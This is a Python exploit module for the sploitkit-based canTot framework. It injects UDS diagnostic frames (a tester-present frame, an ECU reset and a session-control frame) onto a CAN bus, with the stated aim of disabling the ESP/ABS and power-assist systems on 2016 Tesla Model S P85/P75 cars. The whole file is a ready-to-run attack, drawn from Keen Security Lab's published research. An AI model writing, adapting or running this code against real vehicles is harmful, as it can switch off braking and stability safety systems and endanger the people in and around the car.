from sploitkit import *
import can
import time

class tesla_disable_esp_abs(Module):
    """ This module will inject UDS data frames though Gateway and disable ESP/ABS ECU at low speed on a Tesla Model S P85 and P75 in 2016(v7.1(2.28.60) and v7.1(2.32.23)).

    Author:  shipcod3 # canTot module
    Credits: {snie, dlingliu, davendu}@tencent.com [Keen Security Lab of Tencent]
    Reference: https://www.blackhat.com/docs/us-17/thursday/us-17-Nie-Free-Fall-Hacking-Tesla-From-Wireless-To-CAN-Bus-wp.pdf
    Version: 1.0
    """
    config = Config({
        Option(
            'INTERFACE',
            "CAN interface",
            True,
        ): str("vcan0"),
    })    
    def run(self):
        bus = can.interface.Bus(bustype="socketcan", channel=self.config.option('INTERFACE').value)
        try:
            print("[+] Disabling ESP/ABS and Power-assisted System in Chassis")
            resetESP = can.Message(arbitration_id=0x0645, data=[0x02,0x11,0x01,0x0,0x0,0x0,0x0,0x0], is_extended_id=False)
            sessionCtlESP = can.Message(arbitration_id=0x0645, data=[0x02,0x10,0x02,0x0,0x0,0x0,0x0,0x0], is_extended_id=False)
            testerPresentESP = can.Message(arbitration_id=0x0645, data=[0x02,0x3E,0x0,0x0,0x0,0x0,0x0,0x0], is_extended_id=False)

            bus.send(testerPresentESP)
            bus.send(resetESP)
            bus.send(sessionCtlESP)

            while True:
                bus.send(testerPresentESP)
                time.sleep(0.5)
        except:
            print("[-] Module stopped!")
